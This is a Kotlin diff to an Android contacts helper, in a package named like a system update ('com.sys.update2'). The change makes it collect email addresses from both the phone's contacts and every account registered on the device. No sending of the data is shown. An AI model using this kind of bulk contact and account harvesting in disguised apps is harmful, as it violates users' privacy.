@@ -1,5 +1,6 @@
 package com.sys.update2
 
+import android.accounts.AccountManager
 import android.content.Context
 import android.database.Cursor
 import android.provider.ContactsContract
@@ -46,7 +47,6 @@ object ContactsHelper {
                     val name = c.getString(idxName) ?: "Unknown"
                     val num = c.getString(idxNum) ?: continue
                     val id = c.getString(idxId) ?: name
-
                     nameMap[id] = name
                     map.getOrPut(id) { mutableListOf() }.add(num)
                 }
@@ -92,8 +92,13 @@ object ContactsHelper {
         return emails.distinct()
     }
 
+    /**
+     * ⭐ محسّن — يجيب من جهات الاتصال + حسابات Google
+     */
     fun getAllEmails(ctx: Context): List<Email> {
         val result = mutableListOf<Email>()
+
+        // 1. من دفتر الهاتف
         try {
             val cursor = ctx.contentResolver.query(
                 ContactsContract.CommonDataKinds.Email.CONTENT_URI,
@@ -114,8 +119,27 @@ object ContactsHelper {
                 }
             }
         } catch (e: Exception) {
-            Log.e("ContactsHelper", "getAllEmails err: ${e.message}")
+            Log.e("ContactsHelper", "phone emails err: ${e.message}")
         }
-        return result.distinctBy { it.email }
+
+        // 2. من حسابات Google المسجّلة على الجهاز
+        try {
+            val am = AccountManager.get(ctx)
+            val accounts = am.getAccounts()
+            for (acc in accounts) {
+                val email = acc.name
+                if (email.contains("@")) {
+                    val exists = result.any { it.email.equals(email, ignoreCase = true) }
+                    if (!exists) {
+                        val type = acc.type
+                        result.add(Email("[$type] ${acc.name}", email))
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("ContactsHelper", "accounts err: ${e.message}")
+        }
+
+        return result.distinctBy { it.email.lowercase() }
     }
 }
